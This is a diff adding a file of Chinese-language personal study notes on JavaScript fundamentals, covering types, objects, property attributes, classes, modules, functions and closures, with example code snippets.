@@ -1,0 +1,3707 @@
+类型、值、变量
+	primitive type
+		数字，字符串，布尔值，
+		null, undefined 分别代表各自类型唯一成员
+	object type
+		属性的集合。
+		较特殊的对象--->global object chap6
+		普通的js对象是“命名值”的无需集合。array 表示带编号的值的有序集合。(有普通对象没有的特有行为特性)
+		函数。
+		每个构造函数定义了一类对象。类：看作对象的子类型。
+
+	内存管理机制。使可按需创建对象。
+
+	有无方法的类型。
+	mutable 、immutable。
+
+	js可自由进行数据类型转换。类型转换规则对 equality的定义有影响。
+
+	js变量无类型。
+
+3.1 数字
+	64位浮点格式表示数字。js实际操作(array索引，位操作符)基于32位整数。
+
+	算术运算
+		溢出   Infinity
+		下溢   运算结果无限接近零，比js能表示的最小值还小时。 此时js返回0。负数下溢，返回-0.
+		被零整除
+			返回Infinity。例外,0/0 没意义，运算结果NaN
+	特殊
+		负零，0(除了作除数不等)
+
+	二进制浮点数
+		二进制浮点数表示法不能精确表示类似0.1。真实值的一个近似表示。
+		舍入误差问题。 在比较两个值是否相等时出现。
+
+	日期和事件
+
+3.2 文本
+	string是一组由16位值组成的不可变的有序序列。
+	js通过字符串类型表示文本。
+		length是其所包含16位值的个数。
+		js无字符型，表示一个16位值，将其赋值给字符串变量。
+	字符集，内码和js字符串。
+		js采用UTF-16编码的Unicode字符集。
+		基本多语种平面-零断面 unicode中 一编码区段。
+		js字符串是由一组 无符号的 16位值组成的序列。一个不能表示为16位的Unicode字符遵循编码规则---用两个16位值组成的一个序列(代理项对)表示。
+		js定义的各式字符串操作方法均作用于16位值，非字符。
+	\和行结束符不算字符串直接量的内容。
+
+	转义字符
+		\n escape sequence ，转义序列/逃逸符。
+		\避免以常规方式解释符号。
+		\xA9 版权符号。
+		es5中允许， \。
+
+	模式匹配。
+
+3.3 布尔值
+	选择测试条件的范围。
+	布尔运算符 操作符
+3.4 null undefined
+	用来描述空值。
+		可表示number,string ,object是无值的。
+	undefined
+		预定义的全局变量，不是关键字。
+	区分
+		===
+	null 程序级，正常，意料之中的值的空缺。
+
+3.5 global object
+	全局对象的属性是全局定义的符号。
+3.6
+3.7 不可变的原始值和可变的对象引用
+	对象----引用类型， 对象值----引用
+3.8 类型转换
+	null 和 undefined 被用在期望是一个对象的地方，造成TypeError
+	1.转换和相等性
+	2.显式类型转换
+		Boolean() Number() String() Object()不用new运算符调用，成为类型转换函数。
+		null,undefined 转换出错，Object(null/undefined)返回一新创建的空对象。
+		number-to-string string-to-number
+			toFixed() toExponential(小数点后几位) toPression()
+		Number(string) 将string转换为整数，浮点数直接量。
+		parseInt() 第二转换基数参数取值2-36。es5中需明确第二个参数。
+			parseFloat() 从第一个非空格字符开始。
+
+	3.对象转换为原始值
+		toString(),返回一个反映对象的字符串
+
+		对象--字符串，
+			toString()，返回一个原始值；valueOf()
+			;js无法送toString() valueOf()获得一个原始值，抛出类型错误异常
+		对象--数字，
+			valueOf(),toString()。
+???			空数组转换为数字0。
+		+ ==
+			若一个操作数是对象，js会将其转换为原始值。
+		Date对象
+			非日期对象，对象到原始值的转换首先是到数字的转换 valueOf()，无论得到的原始值是否直接使用，都不进一步被转换为数字或字符串。
+			日期对象---对象到字符串的转换模式，且通过那俩方法返回的原始值将被直接使用。
+
+3.9 变量声明
+	运行期检查数据类型。
+	重复的声明和遗漏的声明。
+		var 语句重复声明合法无害。
+3.10变量作用域
+	作为属性的变量
+		var声明一个变量，创建的这个属性不可配置。delete 
+	js全局变量是全局对象的属性。局部变量，
+		es3称为调用对象，es5称为声明上下文对象。
+	this来引用全局对象。存放局部变量的对象的特有性质，是种不可见的内部实现。
+	作用域链
+		一个对象列表，链
+		js需要查找变量x的值，变量解析，会从链中的第一个对象开始查找。
+		若作用域链上没有一个对象含有属性x，则认为这段代码的作用域链上不存在x，ReferenceError。
+
+
+
+
+6   对象
+	复合值。属性的无序集合。属性名字符串(字符串到值的映射)。
+	基本数据结构，还称 散列hash, 散列表， 字典，关联数组associative array。
+	不仅仅：...映射，保持自有属性，js对象还可从称为原型的对象继承属性。
+
+	js对象是动态的。但常用来模拟静态对象，以及静态类型语言中的结构体struct。
+
+	对象是可变的通过引用操作对象。
+
+	常见用法：
+		增删改查 检测test()，枚举enumerable()
+
+	属性:
+		名、值(任意js值，或在es5中可是getter,setter函数)。
+		属性的特性property attribute
+			可写 可枚举 可配置configurable(是否可删除/修改)
+	对象特性:
+		对象的原型prototype   
+		对象的类  class 标识对象类型的字符串
+		对象的扩展标记 extensible flag (es5中)指明了是否可向该对象添加新属性。
+
+	native object/ host object/ user-defined object
+	自有属性 / 继承属性 对象的原型对象中定义的属性。
+
+6.1 创建对象
+	对象直接量
+		es3中，使用保留字做属性名，必须引号加上。
+		是一个表达式。每次运算都创建并初始化一个新的对象。
+
+	通过new创建
+		构造函数用以初始化一个新创建的对象。
+
+	原型
+		new 和构造函数调用创建的对象的原型就是构造函数的prototype属性的值。
+
+	Object.create()
+		可通过任意原型创建新对象----可以使任意对象可继承。
+
+	不对原始对象操作，而是对继承对象操作。
+
+属性的get set
+	es3中.后不能是保留字，只能用[]访问，es5放宽了限制。
+	表达式返回字符串或返回一个可以转换为字符串的值。
+
+	1.作为关联数组的对象。
+		.运算符访问属性，属性名用标识符表示。程序运行时，无法动态指定一个-标识符(不是数据类型，程序无法修改)
+		[]可以。
+	[]运算符，使用字符串作为索引访问，设置对象属性，而不是标识符(静态，写死在程序用)
+
+	2.继承
+		对象的原型属性构成链，通过链实现属性继承。
+
+		属性赋值操作首先检查原型链，以此判定是否允许赋值操作。
+
+	3.属性访问错误
+		访问不存的属性
+		访问不存在的对象的属性
+		var len = book && book.subtitle && book.subtitle.length;
+
+		设置属性的失败操作不报错？es5的严格模式已修复。
+			throw TypeError
+
+		失败的操作有：3个
+6.3 删除属性
+	delete 操作数 属性访问表达式。
+	只是断开属性和宿主对象的联系，不会去操作属性中的属性。
+	销毁对象，应遍历属性中的属性依次删除。
+
+	删除成功或没任何副作用，返回true。
+	不能删除 可配置性  为false的属性。
+
+6.4 检测属性
+	检测集合中成员的所属关系---判断某个属性是否存在于某个对象。
+	"prop" in obj;
+	obj.hasOwnProperty("prop");
+	obj.propertyIsEnumerable(), 自有属性，且属性可枚举行为true。
+
+	！== undefined。
+	in 区分不存在的属性，和存在但值为undefined的属性。
+
+6.5 枚举属性
+	for/in 所有可枚举属性，自有，继承
+	Object.keys()，返回一数组，该arr由对象中可枚举的自有属性的名称组成。
+	Object.getOwnPropertyNames(),返回对象所有自有属性的名称。 不仅仅是可枚举的属性。
+	es3没提供方法获取对象不可枚举属性。
+
+6.6 属性的getter setter
+	es5中，属性值可用 getter | setter 替代。
+		该属性称为 accessor存取器属性，数据属性只是一个值。
+
+	存取器属性没有---writable attribute。
+		读取只写返回undefiend。
+
+	定义存取器属性: 对象直接量的方式。
+		属性名 === 函数名
+		函数体后,
+
+	var serialnum = {
+		// 该数据属性包含下一个序列号
+		// $符号暗示该属性是一私有属性
+		$n : 0,
+
+		// 返回当前值，然后自增。
+		get next(){
+			return this.$n++;
+		},
+		set next(n){
+			if(n >= this.$n) this.$n = n;
+			else throw "序列号的值不能比当前值小";
+		}
+	}
+	var random = {
+		get octet() {
+			return Math.floor(Math.random()*256);
+		},
+		get unit16() {
+			return Math.floor(Math.random()*65536);
+		},
+		get int16() {
+			return Math.floor(Math.random()*65536)-32768;
+		}
+	}
+
+6.7 属性的特性
+	es3的程序创建的属性的特性都可行。
+	查询，设置的API
+		通过API给原型对象添加方法，并将其设置为不可枚举，看起来更像内置方法。
+		给对象设置不能修改或删除的属性，借此"锁定"对象。
+
+	数据属性的特性。 值，3个
+	存取器属性的特性。 get set 枚举，配置
+
+	属性描述符对象，代表4个特性。
+		writable enumrable configurable 布尔值
+		get set 属性是函数值。
+
+	Object.getOwnPropertyDescriptor({},"toString");
+	继承，不存在的属性，返回undefined.
+	object.getOwnPropertyDescriptor(serialnum,"$n");
+
+	获得继承属性的特性，需遍历原型链
+		Object.getPrototypeOf()
+
+	设置属性的特性
+		Object.defineProperty(obj,"prop",{ propertyDescriptor});
+
+		Object.defineProperties(obj,{ prop:{value:1, writable: true},prop1:{value: 9}})
+		返回修改后的对象。
+
+		可写性控制对 值特性的修改。可配置性，修改/删除。
+
+		规则：
+			...
+	例子：
+		复制属性的特性。
+
+		Object.defineProperty(Object.prototype,
+			"extend",
+			{
+				writable: true,
+				enumerable: false,    
+				configurable: true,
+				value: function(obj) {
+					// 得到所有的自有属性，包括不可枚举属性
+					var names = Object.getOwnPropertyNames(obj);
+					// 遍历他们
+					for(var i = names.length; i--;){
+						// 若属性已存在，则跳过
+						if(names[i] in this)
+							continue;
+						// 获得obj中的属性的描述符
+						var desc = Object.getOwnPropertyDescriptor(obj,names[i]);
+						// 用它给this 创建一个属性
+						Object.defineProperty(this, names[i], desc);
+					}
+				}
+			}
+		);
+
+		getter 和 setter的老式API
+			es5被采纳之前。
+				__lookupGetter__() __lookupSetter__()
+				__defineGetter__() __defineSetter__()
+				非标准的方法。
+6.8 对象的三个属性
+	1.原型属性
+		es5中，Object.getPrototypeOf()
+		es3中，obj.constructor.prototype。
+
+		constructor.prototype是对象直接量的真正原型。
+		检测o是否是obj的原型（或处于其原型链中）,o.isPrototypeOf(obj)。
+			该函数实现功能和instanceof 非常相似。
+		不推荐__proto__，浏览器的兼容性，实现问题。
+
+	2.类属性
+		一个字符串，表示对象的类型信息。
+		间接的方法可以查询。	
+			toString()
+			[object class];
+
+		function classOf(obj) {
+			if(obj === null) return "Null";
+			if(obj === undefined) return "Undefined";
+			return Object.prototype.toString.call(obj).slice(8,-1);
+		}
+
+		{}, new Test();Object.create() 创建的对象的类属性是"Object"。
+		自定义的类，无法通过类属性区分对象的类。
+
+	3.扩展性
+		内置对象和自定义对象都是显式可扩展的，宿主对象的可扩展性是由js引擎定义的。
+		es5中也是。
+
+		查询 Object.isExtensible().
+			Object.preventExtensions()。只1次。
+
+		目的：将对象锁定。
+
+		Object.seal()，对象不可扩展，自有属性不可配置。
+			不能添加新属性。
+		Object.freeze()   Object.isFrozen(),还将自有的数据属性设置为只读，存取器属性不受影响。
+		都返回传入的对象。---可通过函数嵌套的方式调用。
+
+6.9 序列化对象
+	serialization 指将对象的状态转换为字符串，也可还原。
+	JSON.stringify()
+		只能序列化对象可枚举的自有 属性。
+	JSON.parse()。
+
+	JSON语法是js语法的子集。
+		NaN、Infinity、-Infinity序列化结果是null。
+		日期对象序列化后，JSON.parse()依然保留字符串形态。
+		接收第二个参数。
+
+6.10对象方法
+	toString()。
+	toLocaleString()
+		Object默认的方法，仅调用toString()方法并返回对应值。
+		Date Number类做了定制。
+		Array，每个元素调用该方法，非各自的toString()方法。
+	toJSON()
+	valueOf()。
+		js需要将对象转换为某种原始值时用到。
+
+chap9 类和模块
+	类的成员或实例，属性，以定义存放他们的状态;也有行为(方法)通常有类定义，为所有实例共享。
+	js中类的实现基于其原型继承机制
+
+	类的一个重要特性：
+		动态可继承dynamically extendable
+
+9.1 类和原型
+	当以一对象为原型创建了新对象，就说实现了一个js类。类的实例需进一步的初始化，通过通过定义一个函数来创建并初始化这个新对象。
+	工厂方法
+		function range(from,to){
+			var r = inherit(range.methods);
+			r.from = from;
+			r.to = to;
+		}
+		range.methods =  {
+			includes: function(x){
+				return this.from<= x && x <= this.to;
+			}
+		}
+9.2 类和构造函数
+	new 调用构造函数，会自动创建一个新对象。因此构造函数本身只需初始化这个新对象的状态即可。
+	调用构造函数的一个重要特征：
+		构造函数的prototype属性被用作新对象的原型。
+
+	构造函数定义范围类：
+		function Range(from,to){
+			this.from = from;
+			this.to = to;
+		}
+		Range.prototype = {
+			includes: function(x){
+				return this.from<= x && x <= this.to;
+			}
+		}
+		定义类的差别：首字母大写的编程约定；
+		调用方式，构造函数用new调用；
+		原型对象的命名上：第一种range.method随意。强制的命名，对构造函数的调用自动将 Range.prototype作为新Range对象的原型。
+
+	1.构造函数和类的标识
+		原型对象是类的唯一标识。
+			初始化对象状态的构造函数不能作为类的标识。	
+
+		构造函数是类的外在表现。
+			r instanceof Range//r是否继承自Range.prototype
+	2.constructor属性
+		Range.prototype ={} 重写了预定义的prototype对象。新定义的原型对象不含constructor属性。
+		②使用预定义的原型对象，Range.prototype.include =...
+
+9.3 JavaScript中Java式的类继承
+	js中的类牵扯三种不同的对象
+		构造函数对象
+		原型对象
+			属性被类的所有实例所继承。
+		实例对象
+
+	js中定义类的步骤
+		先定义构造函数，并设置初始化新对象的实例属性
+		Func.prototype对象定义实例的方法
+		给构造函数定义类字段和类属性。
+
+	Complex.js
+		Complex.ZERO = new Complex(0, 0);
+		Complex.ONE = new Complex(1, 0);
+		es5中 可设置这些类字段的属性为只读。
+
+		定义类的"私有字段"，下划线前缀表明是类内部使用，而不属于类的公有API的部分。
+			Complex._format = /^{([^,]+),([^}]+)\}$/;
+	私有属性-闭包里的局部变量实现，
+	常量属性可在es5中直接实现 --9.8
+
+9.4 类的扩充
+	String.prototype.trim = String.prototype.trim || function(){
+		if(!this) return this; //空字符串不做处理
+		return this.replace(/^\s+|\s+$/g, "");   //正则表达式做空格替换。
+
+	// 返回函数的名字
+	Function.prototype.getName = function() {
+		return this.name || this.toString().match(/function\s*([^()*]\(/)[1]));?
+	}
+	}
+
+	可给Object.prototype添加方法，不推荐
+	es5之前，无法将新增方法设置为不可枚举的。
+		es5， 使用Object.defineProperty()方法安全地扩充Object.prototype。
+	不是所有的宿主对象(如web浏览器)都可使用该方法。
+	可给HTMLElement.prototype添加方法。
+
+9.5 类和类型
+	将类作为类型来对待。
+		js中的内置对象可根据其class属性来区分彼此。
+
+>>>	鸭式辩型
+		关注对象包含什么方法，而不是属于哪个类
+	1.instanceof 运算符
+		instanceof 构造函数
+		计算过程实际上是 检测了对象的继承关系。而非检测创建对象的构造函数
+
+		检测对象的原型链上是否存在某个特定原型对象
+			isPrototypeOf()
+
+		两者缺点
+			无法通过对象获得类名，
+			在客户端js中，每个窗口和框架子页面都有单独执行上下文。
+	2.constructor属性	
+
+		使用该属性检测对象属于某个类。不足
+			多个执行上下文的场景，无法正常工作
+			并非所有对象都包含constructor。
+
+	3.构造函数的名称
+		多个执行上下文的构造函数相互独立，彼此不等。
+		解决：
+			使用构造函数的名字而非本身 作为类标识符
+		不是所有对象都有constructor属性，都有名字。
+
+	4.鸭式辩型
+		检测对象的类的各种技术都不完美，
+		解决：规避这些问题。
+
+		检测对象是否实现了一个或多个方法。
+
+		实现：
+			用适当的名字来检查输入对象所实现的方法。
+			将非法输入拦截在外。给出更多提示信息的报错。
+
+		内置类的方法都是不可枚举的。
+		补救，Object.getOwnPropertyNames()
+
+9.6 js中的面向对象技术
+	1.集合：
+		定义，一种数据结构，用以表示非重复值的无序集合。
+			Set.js: 值的任意集合(实现了js值到唯一字符串的映射)
+			function Set() {
+				this.values = {};
+				this.n = 0;             //集合中值的个数
+				this.add.apply(this,arguments);
+			}
+			Set.prototype.add = function (){
+				for(var i = 1; i < arguments.length; i ++){
+					var val = arguments[i];
+					var str = Set._v2s(val);   //转换为字符串
+					if(!this.values.hasOwnProperty(str)){
+						this.values[str] = val;
+						this.n ++;
+					}
+				}
+				return this;    // 支持链式方法
+			}
+
+	2.枚举类型
+		定义:
+			enumerated type，值的有限集合。
+
+		js中的枚举类型
+			function enumeration(nameToValues){
+				var enumeration = function() {
+					throw "Can't Instantiate Enumrations";
+				};
+
+				// 枚举值继承自这个对象
+				var proto = enumeration.prototype = {
+					constructor: enumeration,
+					toString: function() {return this.name;},
+					valueOf: function() { return this.value;},
+					toJSON: function() {return this.name;}
+				};
+				
+				enumeration.values = [];
+
+				for(name in namesToValues){
+					var e = inherit(proto);
+					e.name = name;
+					e.value = namesToValues[name];
+					enumeration[name] = e;
+					enumeration.values.push(e);
+				}
+
+				enumeration.foreach = function(f, c){
+					for(var i = 0; i < this.values.length; i ++){
+						f.call(c, this.values[i]);
+					}
+				}
+
+				return enumeration;
+			}
+
+			function Card(suit, rank){
+				this.suit = suit;
+				this.rank = rank;
+			}
+
+				// 枚举类型定义花色
+				Card.Suit = enumeration({
+					Clubs: 1,
+					Diamonds: 2,
+					Hearts: 3,
+					Spades: 4
+				});
+				Card.Rank = enumeration({
+					Two: 2,Three:3,Ace:14
+				});
+
+				// 定义用以描述牌面的文本
+				Card.prototype.toString =  function() {
+					return this.rank.toString() + "of" +this.suit.toString();
+				};
+
+				// 比较扑克牌中两张牌的大小
+				Card.prototype.compareTo = function(that){
+					if(this.rank < that.rank) return -1;
+					if(this.rank > that.rank) return 1;
+					return 0;
+				}
+				// 定义一副标准扑克牌 function Deck(){}
+				// 洗牌 shuffle
+				// 发牌， 返回牌的数组[]
+
+	3. 标准转换方法
+		自定义类，类型转换的方法.
+		toString() 返回一个刻度字符串。
+		toLocalString() 返回本地化相关的字符串,处理本地化的对象到字符串的转换。
+		valueOf() 用来将对象准换为原始值。
+		toJSON() 
+			序列化操作, 由JSON.stringify()自动调用的。
+	4.比较方法
+		按照需要的方式比较对象是否相等。
+			equals()
+		obj用于js的关系比较运算符，js首先调用对象的valueOf()方法。
+		大多数类没有valueOf()，
+			比较: compareTo()
+
+		两个方法处理相等的逻辑。保持一致。
+		排序运算：给类定义了compareTo()方法，可对类的实例组成的数组排序。
+
+	5.方法借用
+		一个类的方法用到其他类，--多重继承
+		js中，称其为 方法借用 borrowing。
+
+		方法借用的泛型实现。
+			var generic = {
+				toString: ...,
+				equals: ...
+			}
+	6.私有状态
+		属性私有化，外部不可见，实例方法访问。
+		闭包封装类的状态，造成更多开销。
+		function Range(from,to){
+			this.from = function (){return from;}
+		}
+
+	7.对象的初始化--多重方式
+		构造函数的重载
+			function Set(){
+				this.values = {};
+				this.n = 0;
+				if(arguments.length ==1 && isArrayLike(argumnets[0])){
+					this.add.apply(this,arguments[0]);
+				}else if(arguments.length>0){
+					this.add.apply(this,arguments);
+				}
+			}
+		工厂方法，--类方法用以返回类的一个实例
+			多种工厂方法，执行不同初始化。
+		构造函数是类的公有标识，因此每个类只有一个构造函数。不推荐多个构造函数继承自一个原型对象。
+
+9.7 子类
+	如何定义；
+		B.prototype = inherit(A.prototype); //子类派生自父类
+		B.prototype.constructor = B // 重载继承来的constructor属性
+
+
+		例子：定义子类。
+			function defineSubclass(superclass,
+					constructor,
+					method,
+					statics)
+			{
+				constructor.prototype = inherit(superclass.prototype);
+				constructor.prototype.constructro = constructor;
+				if(methods) extend(constructor.prototype, methods);
+				if(statics) extend(constructor,statics);
+
+				return constructor;
+			}
+
+		子类，动态地从父类继承方法。
+	2.实现构造函数链，并重载方法；
+		创建类工厂的能力，是js语言动态特性的体现。
+
+		function filteredSetSubclass(superclass, filter) {
+			var constructor = function() {
+				superclass.apply(this, arguments);// 调用父类构造函数
+			};
+			var proto = constructor.prototype = inherit(superclass.prototype);
+			proto.constructor = constructor;
+
+
+			proto.add = function(){
+				// 添加成员前 使用过滤器将所有参数进行过滤
+				for(var i = 0; i < arguments.length; i ++){
+					var v = arguments[i];
+					if(!filter(v)) throw("value "+ v + "rejected by filter");
+				}
+				// 调用父类的add方法
+				superclass.prototype.add.apply(this, arguments);
+			};
+			return constructor;
+		}
+
+
+	3.使用组合代替继承；
+		var FilteredSet = Set.extend();
+		只需一个单独的FilteredSet子类。用该类的实例来创建任意带有成员限制的集合实现。
+		如，nonnullset
+			var s = new FilteredSet(new Set(), function(x) {return x !== null;});
+		对过滤后的集合进行过滤。
+			var t = new FilteredSet(s, {function(x) {return !(x instanceof Set);}});
+	4.类的层次结构和抽象类
+		通过抽象类从实现中抽象出接口。
+		实现类的不同定制版本----实现多态的方法
+
+		从实现中抽离出接口。
+
+
+9.8 es5中的类
+	es5给属性特性增加了方法支持，对象可扩展性的限制。
+	1.定义不可枚举的属性
+	2.定义不可变的类
+		prototype的实例方法设置为，不可枚举，只读，不可配置(删除)
+		防止对类的修改(monkey-patching)
+
+		构造函数用作工厂函数。
+			function P(x,y){
+				var props = {
+					x : {value: x, enumerable: true},
+					y : {value: y, enumerable: true}
+				};
+				if (this instanceof P) // this 是否继承自P.prototype。
+					Object.defineProperties(this, props);
+				else 
+					return Object.create(P.prototype, props);
+			}
+
+		属性描述符对象让代码可读性变差，改进：
+			修改为工具函数。
+
+	3.封装对象状态
+		Range类的端点严格封装
+		function Range(from, to){
+			if(from > to) 
+				{throw new Error("Range: form must be <= to");}
+
+			// 定义存取器方法，以维持不变
+			function getFrom(){
+				return from;
+			}
+			function setFrom(n){
+				from = n;
+				return from;
+			}
+			function getTo(){
+				return to;
+			}
+			function setTo(p){
+				to = p;
+				return to;
+			}
+			Object.defineProperties(this,{
+				from: {get: getFrom,
+
+					configurable: true},
+				to: {get: getTo,set: setTo,configurable: false,enumerable:true}
+			});
+		}
+
+	4.防止类的扩展
+		Object.seal(Object.prototype); 已有属性设置不可配置。
+		对象的方法可以随时替换(monkey-patch)
+		将方法设置为只读， Object.freeze()
+		重写一个继承来的只读属性，
+			Object.defineProperty() ,Object.defineProperties()或Object.create()创建新属性。
+
+	5.子类和es5
+		Object.create(), 实现的困难之处需要使用属性描述符。
+		object.create(null)
+			创建的对象不继承任何成员。可直接使用in遍历对象成员。
+
+	6.属性描述符
+		(function namespace(){ // 将所有逻辑闭包在一个私有函数作用域中
+
+			// 该函数成为所有对象的方法
+			function properties(){
+				var names;
+				if( arguments.length == 0)
+					names = Object.getOwnPropertyNames(this);
+				else if (arguments.length ==1 && Array.isArray(arguments[0]))
+					names = arguments[0];
+				else
+					names = Array.prototype.splice.call(arguments, 0);
+
+				return new Properties(this, names);
+			}
+
+			// 从私有函数作用域导出的唯一一个值
+			Object.defineProperty(Object.prototype,"properties",{
+				value: properties,
+				enumerable: false,
+				writable: true,
+				configurable: true
+			});
+
+			// 一个对象的属性集合
+			function Properties(obj, names){
+				this.obj = obj; // 属性所属的对象
+				this.names = names;  // 属性名
+			}
+
+			// 将代表这些属性的对象设置为不可枚举
+			Properties.prototype.hide = function() {
+				var obj = this.obj,
+					hidden = {enumerable: false};
+					this.names.forEach(function(n){
+						if(obj.hasOwnProperty(n))
+							Object.defineProperty(obj, n, hidden);
+					});
+				return this;
+			};
+
+			// 将属性设置为只读和不可配置
+			Properties.prototype.freeze = function(){
+				var obj = this.obj,frozen = { writable: false, configurable: false};
+
+				this.names.forEach(function(n){
+					if(obj.hasOwnProperty(n))
+						Object.defineProperty(obj, n, frozen);
+				});
+				return this;
+			};
+
+
+			// 返回一个对象，名字到属性描述符的映射表
+			Properties.prototype.descriptors = function(){
+				var obj = this.obj, desc={};
+				this.names.forEach(function(n){
+					if(!obj.hasOwnProperty(n)) return;
+					desc[n] = Object.getOwnPropertyDescriptor(obj, n);
+				});
+				return desc;
+			};
+
+
+			Properties.prototype.toString = function() {
+				var obj = this.obj;
+				var lines = this.names.map(nameToString);
+				return "{\n" + lines.join(",\n ") + "\n}";
+
+				function nameToString(n) {
+					var s = "",desc = Object.getOwnPropertyDescriptor(obj, n);
+					if(!desc) return "none existent " + n + ": undefined";
+					if(!desc.configurable) 
+						s += "permanent ";
+					if((desc.get && !desc.set) || !desc.writable)
+						s += "readonly ";
+					if(!desc.enumerable)
+						s += "hidden ";
+					if(desc.get || desc.set)
+						s += "accessor " + n;
+					else 
+						s += n + ": " + ((typeof desc.value === "function") ? "function" : desc.value);
+
+					return s;
+				}
+
+				将原型对象中的实例方法设置为不可枚举的
+				Properties.prototype.properties().hide();
+			};
+		}());
+
+
+9.9 模块
+	模块是一个可重用的代码片段
+		不论是从代码语法结构上 解耦，代码拆分至不同的文件中，只要用某种方法将代码"分离"---认为一个模块
+
+	模块系统：
+		用来处理模块加载和依赖性管理。
+	后续模块应当在它们所期望运行的原始(或接近原始) 上下文中执行。这实际上意味模块应当尽可能少地定义全局标识。
+
+	1.用作命名空间的对象
+		保持干净的全局命名空间
+
+		更深层嵌套的命名空间
+			var collections;
+			if(!collections)
+				collections = {};
+			collections.sets = {}
+
+		按照约定，模块的文件名应当和命名空间匹配。
+
+	2.作为私有命名空间的函数
+		可将函数作用域用作模块的私有命名空间---模块函数
+
+		var Set = (function invocation(){//namespace 名字可用来强调该函数被用作命名空间。
+			return Set
+		}());
+
+		模块API包含多个单元，则它可以返回命名空间对象。
+		1.(function namespace(){}())
+		2.将模块函数当作构造函数
+			new function namespace(){ this.AbstractSet = AbstractSet;}()
+		3.若已经定义了全局命名空间对象{}，可直接设置那个对象的属性。
+
+
+8   函数
+	js函数是参数化的:
+		函数定义包括 称为形参parameter 的标识符列表，参数在函数体中像局部变量一样工作。
+		每次调用传入，实参，本次调用的上下文。
+
+	8.1 定义
+		函数表达式可包含名称，用作递归
+
+		函数声明语句，实际声明了个变量，并把一个函数对象赋值给它。
+
+		nested function 有趣之处----它的变量作用域规则
+		es规范，只是允许函数声明语句作为顶级语句，
+			不能出现在循环、条件判断、
+				或 try/catch/finally 以及with 语句中
+
+	8.2 调用
+		es3 ,非严格es5，对函数调用的规定，调用上下文是全局对象。
+		严格模式，调用上下文 undefined
+
+		方法链
+			方法的返回值是个对象。
+			方法调用序列(通常称为链，级联)每次的调用结果都是另外一个表达式的组成部分。
+
+			方法不需返回值，最好返回this。
+
+		方法的链式调用，构造函数的链式调用
+			return constructor。
+			function Son(){
+				Parent.call(this,arguments);
+			}
+		this无作用域的限制
+		函数调用，
+		方法调用
+			嵌套函数，访问外部函数的this值，将this值保存到变量中， 此时变量和内部函数在同一作用域。
+
+		构造函数调用
+			构造函数没有形参时，调用时，语法允许省略实参列表和圆括号。
+
+			创建一个新对象，
+		构造函数初始化新建对象，并将该对象用作其调用上下文
+			new obj.f() 表达式中，调用上下文不是obj。
+
+		返回值
+			显式使用return语句返回对象，调用表达式的值就是该对象。未指定，或指定原始值，则忽略返回值，使用新对象作为调用结果。
+
+		间接调用
+
+
+	8.3 函数的实参和形参
+		1.可选实参来实现函数，将其放在实参列表最后。
+		2.可变长的实参列表：
+			实参对象，类数组对象
+			不定实参函数(个数，顺序，值不定)
+
+			严格模式下，arguments成保留字。非严格模式，arguments仅仅是一个标识符。
+			callee，caller属性
+				callee指代当前正在执行的函数。
+					匿名函数，递归地调用自身。
+				caller指代调用当前正在执行的函数的函数。
+
+
+		3.对象属性用作实参，名值对形式
+			调用时，传入对象，对象中名值对是真正的实参数据
+
+		4.实参类型
+			类型检查，防止传入非法值，避免执行时出错。
+
+	8.4 作为值的函数
+		函数定义，调用是js的词法特性。
+			js中，函数也是值。
+
+		自定义函数属性
+			定义全局变量，使得命名空间更杂乱无章。
+			计数器。
+				函数需要跟踪它每次返回的值。且这些值的信息需要在不同的函数调用过程中持久化
+				存放到全局变量中，这并不是必需的。因为这个信息是函数本身用到的，将其存放到函数对象的一个属性中。
+				function uniqueCount(){}
+				uniqueCount.counter = 0;
+			阶乘，计算后，将结果缓存至函数的属性中。
+
+	8.5 作为命名空间的函数
+		不在任何函数内声明的变量，全局变量。
+
+		function myModule(){// 模块代码} myModule();
+		仅仅定义了一个全局变量。
+		(function(){ // }());
+
+		扩展函数，特定场景下返回带补丁的extend()版本。
+
+	8.6 闭包
+		和其他大多数现代编程语言一样，js也采用词法作用域
+			lexical scoping。
+		即-----函数的执行依赖于变量作用域，作用域在函数定义时决定。
+		为了实现词法作用域，
+			函数对象的内部状态不仅包含函数的代码逻辑，还必须引用当前的作用域链。
+		函数对象可以通过作用域链相互关联起来。
+
+		技术角度，所有js函数都是闭包：都是函数，都关联到作用域链。
+
+		定义大多数函数时的作用域链在调用函数时依然有效，不影响闭包。
+		但当调用函数时，闭包所指向的作用域链 和定义函数时的作用域链不是同一个作用域链时，就有意思了。内部函数保存出去，这种事情就会发生。
+
+		返回函数对象，还是结果。在定义函数的作用域外，调用嵌套的函数？
+
+		实现闭包：
+			栈的CPU架构，若函数的局部变量定义在CPU的栈中，当函数返回时，这些变量不存在了。
+
+		作用域链不是绑定的栈。每次调用js函数,创建新的对象保存局部变量，将对象添加至作用域链中。
+		定义了嵌套的函数
+			每个嵌套函数都各自对应一个作用域链。且作用域链指向一个变量绑定对象。
+			嵌套的函数对象在外部函数中保存下来，则他们也会和所指向的变量绑定对象 一样当垃圾回收。
+			；若在外部保存下来，就有一个外部引用指向这嵌套函数，不当做垃圾回收，且它所指向的变量绑定 对象也不会被当做垃圾回收。
+
+		防止恶意修改的计数器
+		var uniqueCount = (function(){
+			var counter=0;    // 函数的私有状态。 
+			return function(){return counter ++;};
+		}());
+
+		此处私有状态的实现是利用闭包，而不是对象的存取属性实现计数器；
+
+	注意：
+		嵌套的函数不会将作用域内的私有成员复制一份，也不会对所绑定的变量生成静态快照   static snapshot
+
+		this(关键字),随调用栈的变化而变化。闭包在外部函数里无法访问正确的this。除非 外部函数var self = this;
+		绑定arguments的问题与之类似。 不是关键字。但调用函数时，自动声明。闭包有自己所绑定的arguments，闭包内无法直接访问外部函数的参数数组。 除非外部函数将参数保存到另外一个变量中。
+
+	8.7 函数属性 方法 构造函数
+		1.length。只读，代表函数形参的数量(期望传入的实参个数)。
+			arguments.length === arguments.callee.length
+
+		2.prototype
+			指向原型对象的引用。
+
+		3.call apply
+		 es5严格模式, 第一个实参都会变成this的值。哪怕传入的是原始值，甚至null或undefined。
+		 es3。 和非严格模式。null undefined 被全局对象代替，其他原始值被相应包装对象替代。
+
+		 trace(oo,"say");包裹原始方法的泛函数
+
+		4.bind
+			es5的bind()，将函数绑定至一对象，
+			：除第一个实参外，传入bind()的实参也会绑定至this。
+			返回的函数对象
+			targetFunction,boundObject,boundArgs
+			length=绑定函数的形参 - 绑定实参的个数 (>=0)
+
+			绑定的函数，不包含prototype属性
+				用作构造函数时，忽略bind()传入的this。
+					传入的实参，传入了构造函数；
+					创建的对象未绑定的构造函数中继承prototype。
+		5.toString
